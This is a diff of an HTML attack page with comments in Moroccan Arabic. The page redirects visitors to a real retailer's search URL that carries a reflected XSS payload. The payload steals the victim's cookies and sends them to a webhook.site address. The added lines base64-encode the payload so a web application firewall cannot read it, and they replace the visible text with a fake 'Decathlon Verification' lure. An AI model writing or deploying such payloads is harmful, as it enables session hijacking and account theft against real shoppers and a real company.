@@ -2,16 +2,19 @@
 <html>
 <body>
     <script>
-        // 1. هاد الرابط هو اللي فيه الثغرة
-        // Payload بسيط: كيهز الإيميل أو الكوكيز وكيدير Redirect للـ Webhook
-        let webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+        // 1. الكود اللي باغي يتنفذ (سحب الكوكيز وصيفطهم للـ Webhook)
+        let secretCode = "fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data=' + btoa(document.cookie))";
         
-        // جربنا "a" tag حيت خفيفة بزااف وماتعيقش
-        let xss = "https://www.decathlon.com/search?q=<a/onmouseover='location=\"" + webhook + "?d=\"+btoa(document.cookie)'>MOVE_MOUSE_HERE</a>";
+        // 2. تشفير الكود بـ Base64 باش الـ WAF ما يقراهش
+        let encoded = btoa(secretCode);
+        
+        // 3. الـ Payload اللي كيهرب من الفلتر (استعملنا onerror حيت خفيفة)
+        // وحولنا الـ payload كامل لـ URL encoded باش يدوز سلاسل
+        let xss = "https://www.decathlon.com/search?q=%3Csvg/onload=eval(atob('" + encoded + "'))%3E";
 
-        // 2. حول الصفحة لـ Decathlon
+        // 4. تحويل الصفحة
         window.location.href = xss;
     </script>
-    <h1>Click anywhere to continue...</h1>
+    <h2>Redirecting to Decathlon Verification...</h2>
 </body>
 </html>
